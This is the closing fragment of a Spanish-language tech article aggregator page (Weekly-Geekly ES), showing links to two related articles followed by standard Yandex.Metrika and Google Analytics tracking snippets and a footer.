<li><a href="../480468/index.html">Implementaci√≥n de aplicaciones de cartuchos de Tarantool sin esfuerzo (Parte 1)</a></li>
<li><a href="../480470/index.html">D√≥nde ir a trabajar como desarrollador junior</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>